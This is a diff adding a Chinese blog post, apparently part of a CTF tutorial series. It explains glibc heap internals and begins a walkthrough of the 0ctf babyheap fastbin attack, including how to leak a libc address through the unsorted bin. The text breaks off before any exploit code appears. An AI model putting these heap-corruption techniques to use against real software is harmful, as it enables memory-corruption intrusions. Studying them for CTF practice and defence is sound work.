@@ -1,0 +1,1386 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222"/>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2"/>
+
+<link rel="stylesheet" href="/css/main.css?v=7.0.1"/>
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.0.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.0.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.0.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.0.1" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '7.0.1',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="Fastbin attack前言通过一道babyheap例题讲解fastbin attack，同时会涉及到一个泄露libc地址的方法，绕过GOT写保护劫持PC的方法，一个绕过Fastbin 大小检测的方法，还有对glibc相关源码的一些讲解。 涉及到的glibc的知识要把这道题做出来，需要对下面的基础知识有所了解。 源码中MIN_CHUNK_SIZE大小是多少MIN_CHUNK_SIZE指的是一个">
+<meta property="og:type" content="article">
+<meta property="og:title" content="堆利用系列四：Fast Bin Attack">
+<meta property="og:url" content="https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BFastbin-Attack/index.html">
+<meta property="og:site_name" content="Colorlight&#39;s Blog">
+<meta property="og:description" content="Fastbin attack前言通过一道babyheap例题讲解fastbin attack，同时会涉及到一个泄露libc地址的方法，绕过GOT写保护劫持PC的方法，一个绕过Fastbin 大小检测的方法，还有对glibc相关源码的一些讲解。 涉及到的glibc的知识要把这道题做出来，需要对下面的基础知识有所了解。 源码中MIN_CHUNK_SIZE大小是多少MIN_CHUNK_SIZE指的是一个">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-28-11-11-50.png">
+<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-27-17-02-02.png">
+<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-28-11-38-36.png">
+<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-28-11-48-10.png">
+<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-27-17-32-32.png">
+<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-28-11-58-27.png">
+<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-28-16-00-59.png">
+<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-28-17-30-46.png">
+<meta property="article:published_time" content="2021-06-17T13:06:10.000Z">
+<meta property="article:modified_time" content="2021-06-17T13:27:04.721Z">
+<meta property="article:author" content="Colorlight">
+<meta property="article:tag" content="堆利用">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://colorlight.github.io/images/heap_exp/2021-05-28-11-11-50.png">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Colorlight's Blog" type="application/atom+xml"/>
+
+
+
+
+  <link rel="canonical" href="https://colorlight.github.io/2021/06/17/堆利用系列之Fastbin-Attack/"/>
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>堆利用系列四：Fast Bin Attack | Colorlight's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Colorlight's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">思维改变生活</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br/>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br/>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br/>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br/>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br/>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br/>站点地图</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br/>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+  
+  
+  
+  
+
+  
+
+  <a href="https://github.com/colorlight" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" style="fill: #222; color: #fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BFastbin-Attack/"/>
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Colorlight"/>
+      <meta itemprop="description" content=""/>
+      <meta itemprop="image" content="https://avatars1.githubusercontent.com/u/13530839?s=460&v=4"/>
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Colorlight's Blog"/>
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">堆利用系列四：Fast Bin Attack
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2021-06-17 21:06:10" itemprop="dateCreated datePublished" datetime="2021-06-17T21:06:10+08:00">2021-06-17</time>
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E5%A0%86%E5%88%A9%E7%94%A8/" itemprop="url" rel="index"><span itemprop="name">堆利用</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+              
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+            
+                <span class="post-meta-item-text">评论数：</span>
+                <a href="/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BFastbin-Attack/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BFastbin-Attack/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="Fastbin-attack"><a href="#Fastbin-attack" class="headerlink" title="Fastbin attack"></a>Fastbin attack</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>通过一道babyheap例题讲解fastbin attack，同时会涉及到一个泄露libc地址的方法，绕过GOT写保护劫持PC的方法，一个绕过Fastbin 大小检测的方法，还有对glibc相关源码的一些讲解。</p>
+<h3 id="涉及到的glibc的知识"><a href="#涉及到的glibc的知识" class="headerlink" title="涉及到的glibc的知识"></a>涉及到的glibc的知识</h3><p>要把这道题做出来，需要对下面的基础知识有所了解。</p>
+<h4 id="源码中MIN-CHUNK-SIZE大小是多少"><a href="#源码中MIN-CHUNK-SIZE大小是多少" class="headerlink" title="源码中MIN_CHUNK_SIZE大小是多少"></a>源码中MIN_CHUNK_SIZE大小是多少</h4><p>MIN_CHUNK_SIZE指的是一个CHUNK最小为多大<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))</span><br></pre></td></tr></table></figure></p>
+<p>是fd_nextsize在malloc_chunk中的偏移，并不是malloc_chunk这个数据结构的大小<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">struct malloc_chunk &#123;</span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */</span><br><span class="line">  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */</span><br><span class="line"></span><br><span class="line">  struct malloc_chunk* fd;         /* double links -- used only if free. */</span><br><span class="line">  struct malloc_chunk* bk;</span><br><span class="line"></span><br><span class="line">  /* Only used for large blocks: pointer to next larger size.  */</span><br><span class="line">  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */</span><br><span class="line">  struct malloc_chunk* bk_nextsize;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
+<p>因为每个chunk都会有prev_size, size， fd,bk这几个成员，但是只有large chunk拥有fd_nextsize和bk_nextsize</p>
+<h4 id="MINSIZE"><a href="#MINSIZE" class="headerlink" title="MINSIZE"></a>MINSIZE</h4><p>MINSIZE是指用户能够得到的最小的chunk 大小，与MIN_CHUNK_SIZE区别是它要求是对其的，所以是可能大于MIN_CHUNK_SIZE的<br>但是对于32位和64位的x86类型来说，MINSIZE与MIN_CHUNK_SIZE大小是一样的。32位MINSIZE=MIN_CHUNK_SIZE=16bytes,64位为32bytes。</p>
+<h4 id="chunk与用户使用的mem之间的转换"><a href="#chunk与用户使用的mem之间的转换" class="headerlink" title="chunk与用户使用的mem之间的转换"></a>chunk与用户使用的mem之间的转换</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))</span><br><span class="line">#define mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))</span><br></pre></td></tr></table></figure>
+<h4 id="MALLOC-ALIGN-MASK"><a href="#MALLOC-ALIGN-MASK" class="headerlink" title="MALLOC_ALIGN_MASK"></a>MALLOC_ALIGN_MASK</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)</span><br></pre></td></tr></table></figure>
+<h4 id="MALLOC-ALIGN-MASK-1"><a href="#MALLOC-ALIGN-MASK-1" class="headerlink" title="MALLOC_ALIGN_MASK"></a>MALLOC_ALIGN_MASK</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#  define MALLOC_ALIGNMENT       (2 *SIZE_SZ &lt; __alignof__ (long double)      \</span><br><span class="line">                                  ? __alignof__ (long double) : 2 *SIZE_SZ)</span><br></pre></td></tr></table></figure>
+<p>经过我的测试：<br><code>x86 32情况下，__alignof__ (long double)为4</code><br><code>x64 情况下， __alignof__ (long double)为16</code></p>
+<p>所以32位下，MALLOC_ALIGNMENT的值为8，MALLOC_ALIGN_MASK  为7；<br>64位下MALLOC_ALIGNMENT值为16，MALLOC_ALIGN_MASK为15.</p>
+<h4 id="request2size-req"><a href="#request2size-req" class="headerlink" title="request2size(req)"></a>request2size(req)</h4><p>malloc(req)，到底会生成多大的chunk，是需要用 request2size(req)确定<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define request2size(req)                                         \</span><br><span class="line">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span><br><span class="line">   MINSIZE :                                                      \</span><br><span class="line">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br></pre></td></tr></table></figure></p>
+<p>那么在32位下的req如何转换：<br>1.首先计算req + 4 + 7是否小于16<br>2.如果小于16,那么就转换为16<br>3.如果大于16就转换为(req + 4 + 7) &amp; ~7 就是 (req+11)&amp;0xfff8<br>自己写了个脚本测试了几个例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">def request2size(req,word):</span><br><span class="line">    sz_32 = 4</span><br><span class="line">    sz_64 = 8</span><br><span class="line">    mask_32= 7</span><br><span class="line">    mask_64 = 15</span><br><span class="line">    min_size_32 = 16</span><br><span class="line">    min_size_64 = 32</span><br><span class="line">    if word == 32:</span><br><span class="line">        if (req + sz_32 + mask_32 ) &lt; min_size_32:</span><br><span class="line">            return min_size_32</span><br><span class="line">        else:</span><br><span class="line">            return (req + sz_32 + mask_32 ) &amp; ~mask_32</span><br><span class="line">    elif word == 64:</span><br><span class="line">        if (req + sz_64 + mask_64 ) &lt; min_size_64:</span><br><span class="line">            return min_size_64</span><br><span class="line">        else:</span><br><span class="line">            return (req + sz_64 + mask_64 ) &amp; ~mask_64</span><br></pre></td></tr></table></figure></p>
+<p>32 位下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">req:0, to:16</span><br><span class="line">req:1, to:16</span><br><span class="line">req:2, to:16</span><br><span class="line">req:3, to:16</span><br><span class="line">req:4, to:16</span><br><span class="line">req:5, to:16</span><br><span class="line">req:6, to:16</span><br><span class="line">req:7, to:16</span><br><span class="line">req:8, to:16</span><br><span class="line">req:9, to:16</span><br><span class="line">req:10, to:16</span><br><span class="line">req:11, to:16</span><br><span class="line">req:12, to:16</span><br><span class="line">req:13, to:24</span><br><span class="line">req:14, to:24</span><br></pre></td></tr></table></figure></p>
+<p>可以看到，如果malloc()的大小小于等于12则最终得到的chunk大小为16</p>
+<p>64位下的测试结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">req:0x70, to:0x80</span><br><span class="line">req:0x71, to:0x80</span><br><span class="line">req:0x72, to:0x80</span><br><span class="line">req:0x73, to:0x80</span><br><span class="line">req:0x74, to:0x80</span><br><span class="line">req:0x75, to:0x80</span><br><span class="line">req:0x76, to:0x80</span><br><span class="line">req:0x77, to:0x80</span><br><span class="line">req:0x78, to:0x80</span><br><span class="line">req:0x79, to:0x90</span><br></pre></td></tr></table></figure></p>
+<p>可以看到，当我们malloc申请的大小为0x78的时候，最终分配的chunk大小是0x80，这感觉有点违背直觉，因为chunk header就是16个字节，那么分配0x78大小的时候至少chunk应该是0x78 + 0x10 = 0x88，至少应该是0x88，如果考虑16字节对齐的情况下，那么大小应该是0x90才对的？这是一个值得思考的问题，大家可以考虑一下为什么是0x80而不是0x90.</p>
+<h4 id="往unsorted-bin中插入一个chunk"><a href="#往unsorted-bin中插入一个chunk" class="headerlink" title="往unsorted bin中插入一个chunk"></a>往unsorted bin中插入一个chunk</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">     bck = unsorted_chunks(av);</span><br><span class="line">     fwd = bck-&gt;fd;</span><br><span class="line">     if (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">&#123;</span><br><span class="line">  errstr = &quot;free(): corrupted unsorted chunks&quot;;</span><br><span class="line">  goto errout;</span><br><span class="line">&#125;</span><br><span class="line">     p-&gt;fd = fwd;</span><br><span class="line">     p-&gt;bk = bck;</span><br><span class="line">     if (!in_smallbin_range(size))</span><br><span class="line">&#123;</span><br><span class="line">  p-&gt;fd_nextsize = NULL;</span><br><span class="line">  p-&gt;bk_nextsize = NULL;</span><br><span class="line">&#125;</span><br><span class="line">     bck-&gt;fd = p;</span><br><span class="line">     fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">     set_head(p, size | PREV_INUSE);</span><br><span class="line">     set_foot(p, size);</span><br><span class="line"></span><br><span class="line">     check_free_chunk(av, p);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>当free一个合适大小的chunk的时候，会往unsorted bin中插入这个chunk, 插入一个chunk的时候需要对四个指针进行写，分别是该chunk的fd和bk指针，以及前后相邻的两个chunk的一个bk和一个fd指针。</p>
+<h4 id="malloc一个在unsorted-bin上的chunk"><a href="#malloc一个在unsorted-bin上的chunk" class="headerlink" title="malloc一个在unsorted bin上的chunk"></a>malloc一个在unsorted bin上的chunk</h4><p>如果unsorted bin有比申请大的chunk，就会直接把它分割，让剩下的chunk加入到unsorted bin 链表中。<br>具体操作如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">        remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">        /* We cannot assume the unsorted list is empty and therefore</span><br><span class="line">            have to perform a complete insert here.  */</span><br><span class="line">        bck = unsorted_chunks (av);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">if (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">        &#123;</span><br><span class="line">            errstr = &quot;malloc(): corrupted unsorted chunks 2&quot;;</span><br><span class="line">            goto errout;</span><br><span class="line">        &#125;</span><br><span class="line">        remainder-&gt;bk = bck;</span><br><span class="line">        remainder-&gt;fd = fwd;</span><br><span class="line">        bck-&gt;fd = remainder;</span><br><span class="line">        fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">        /* advertise as last remainder */</span><br><span class="line">        if (in_smallbin_range (nb))</span><br><span class="line">        av-&gt;last_remainder = remainder;</span><br><span class="line">        if (!in_smallbin_range (remainder_size))</span><br><span class="line">        &#123;</span><br><span class="line">            remainder-&gt;fd_nextsize = NULL;</span><br><span class="line">            remainder-&gt;bk_nextsize = NULL;</span><br><span class="line">        &#125;</span><br><span class="line">        set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">        set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">        set_foot (remainder, remainder_size);</span><br><span class="line">    &#125;</span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    void *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    return p;</span><br></pre></td></tr></table></figure></p>
+<h4 id="初始化bins"><a href="#初始化bins" class="headerlink" title="初始化bins"></a>初始化bins</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for (i = 1; i &lt; NBINS; ++i)</span><br><span class="line">   &#123;</span><br><span class="line">     bin = bin_at (av, i);</span><br><span class="line">     bin-&gt;fd = bin-&gt;bk = bin;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<h3 id="0ctf-babyheap"><a href="#0ctf-babyheap" class="headerlink" title="0ctf babyheap"></a>0ctf babyheap</h3><p>题目文件下载地址<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2017_0ctf_babyheap" target="_blank" rel="noopener">babyheap</a></p>
+<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>目标是泄露libc的地址，借助的是泄露unsorted bin所在的地址进而推导出其他地址。<br>因为unsroted bin所在的数据结构是在libc的读写区分配的，因此是可以借助它进行地址泄露的。</p>
+<p>泄露unsorted bin地址的方法是把unsorted bin的头部chunk的bk指针给泄露出来。<br>我们看一个正常的拥有两个元素的unsorted bin的结构<br><img src="/images/heap_exp/2021-05-28-11-11-50.png" alt></p>
+<p>这个头部chunk的bk指针就是指向的是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure></p>
+<p><code>unsorted_chunks(av)</code>这个地址到底是哪里<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#define unsorted_chunks(M)          (bin_at (M, 1))</span><br><span class="line"></span><br><span class="line">#define bin_at(m, i) \</span><br><span class="line">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))			      \</span><br><span class="line">             - offsetof (struct malloc_chunk, fd))</span><br></pre></td></tr></table></figure></p>
+<p>av就是main_arena，我们把1代入bin_at得到unsorted_chunks(av)的地址为main_arena-&gt;bins - chunk header的大小就是main_arena-&gt;top的地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">struct malloc_state</span><br><span class="line">&#123;</span><br><span class="line">  /* Serialize access.  */</span><br><span class="line">  mutex_t mutex;</span><br><span class="line"></span><br><span class="line">  /* Flags (formerly in max_fast).  */</span><br><span class="line">  int flags;</span><br><span class="line"></span><br><span class="line">  /* Fastbins */</span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  /* Base of the 